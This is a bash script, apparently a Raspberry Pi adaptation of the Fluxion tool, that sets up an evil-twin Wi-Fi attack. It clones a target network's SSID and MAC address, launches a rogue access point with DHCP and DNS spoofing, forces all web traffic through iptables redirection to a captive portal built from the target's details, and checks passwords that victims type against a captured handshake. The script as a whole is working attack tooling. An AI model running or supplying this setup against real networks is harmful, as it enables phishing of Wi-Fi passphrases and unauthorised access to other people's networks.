#!/bin/bash
function trap_ctrlc ()
{
    # perform cleanup here
    echo "Ctrl-C caught...performing clean up"
	if [ -z "$(pgrep -f captive_portal_authenticator.sh)" ]; then
		kill -9 $(pgrep -f captive_portal_authenticator.sh)
	fi
	if [ -z "$(pgrep -f fluxion_captive_portal_dns.py)" ]; then
		kill -9 $(pgrep -f fluxion_captive_portal_dns.py)
	fi
	killall -9 hostapd
	killall -9 lighttpd
	killall -9 dhcpd

    # exit shell script with error code 2
    # if omitted, shell script will continue execution
    exit 2
}


# initialise trap to call trap_ctrlc function
# when signal 2 (SIGINT) is received
trap "trap_ctrlc" 2

if [ -z "$(pgrep -f captive_portal_authenticator.sh)" ]; then
kill -9 $(pgrep -f captive_portal_authenticator.sh)
fi
if [ -z "$(pgrep -f fluxion_captive_portal_dns.py)" ]; then
kill -9 $(pgrep -f fluxion_captive_portal_dns.py)
fi

if (( $# < 3 ));
  then
    printf "You need to provide positional arguments - ssid, channel and mac address.\nStart the script like this:\nsudo ./fluxPi.sh HotSpot 6 'xx:xx:xx:xx:xx'\n"
    exit 1
fi


	printf "Creating and copying .conf files\n"
	if [ -d "/tmp/fluxpi/" ]; then
		rm -r /tmp/fluxpi/
		rm /tmp/fluxpi/*
	fi

	mkdir /tmp/fluxpi
	mkdir /tmp/fluxpi/captive_portal
	openssl req -subj '/CN=captive.router.lan/O=CaptivePortal/OU=Networking/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout "/tmp/fluxpi/server.pem" -out "/tmp/fluxpi/server.pem"
	chmod 400 "/tmp/fluxpi/server.pem"

		echo "\
interface=wlan0
driver=nl80211
ssid=$1
channel=$2
hw_mode=g
auth_algs=1
wmm_enabled=0
\
" > "reqs/hostapd.conf"
	sleep 1
	cp -r reqs/* /tmp/fluxpi/
	ip addr add 192.168.254.1/24 dev wlan0
	cp dump.cap /tmp/fluxpi/network.cap
	ssid=$1
	channel=$2
	mac=$3
	ifconfig wlan0 down
	sleep 1
	macchanger -m $mac wlan0
	sleep 1
	ifconfig wlan0 up
	sleep 1
	sed -i "s|%%SSID%%|$1|g" /tmp/fluxpi/captive_portal/index.html
        sed -i "s|%%CHANNEL%%|$2|g" /tmp/fluxpi/captive_portal/index.html
        sed -i "s|%%MAC%%|$3|g" /tmp/fluxpi/captive_portal/index.html
	touch /tmp/fluxpi/captive_portal/clients.txt
	touch /tmp/fluxpi/captive_portal/hit.txt
	# Activate system IPV4 packet routing/forwarding.
	sysctl -w net.ipv4.ip_forward=1 &>wlan0

	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	iptables -P FORWARD ACCEPT

	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.254.1:80
	iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.254.1:443
	iptables -A INPUT -p tcp --sport 443 -j ACCEPT
	iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
	iptables -t nat -A POSTROUTING -j MASQUERADE

	touch /tmp/fluxpi/dhcpd.leases


	printf "Starting Captive Portal\n"

	killall -9 lighttpd
	sleep 1
	killall -9 dhcpd
	sleep 1
	killall -9 hostapd

	sleep 1
	hostapd -B "/tmp/fluxpi/hostapd.conf" &
	sleep 1
	dhcpd -f -lf "/tmp/fluxpi/dhcpd.leases" -cf "/tmp/fluxpi/dhcpd.conf" wlan0 | tee -a "/tmp/fluxpi/captive_portal/clients.txt" &
	sleep 1
	chmod +x "/tmp/fluxpi/fluxion_captive_portal_dns.py"
	touch "/tmp/fluxpi/dns.log"
	sudo python "/tmp/fluxpi/fluxion_captive_portal_dns.py" > "/tmp/fluxpi/dns.log" &
	touch /tmp/fluxpi/lighttpd.log
	lighttpd -f /tmp/fluxpi/lighttpd.conf
	sleep 1
	chmod +x /tmp/fluxpi/captive_portal_authenticator.sh
	/tmp/fluxpi/captive_portal_authenticator.sh &
	printf "\n"
	read -p "Press [Enter] key to start backup..."
	printf "\n"
	killall -9 dhcpd
	killall -9 lighttpd
	killall -9 hostapd

	if [ -z "$(pgrep -f captive_portal_authenticator.sh)" ]; then
	kill -9 $(pgrep -f captive_portal_authenticator.sh)
	fi
	if [ -z "$(pgrep -f fluxion_captive_portal_dns.py)" ]; then
	kill -9 $(pgrep -f fluxion_captive_portal_dns.py)
	fi

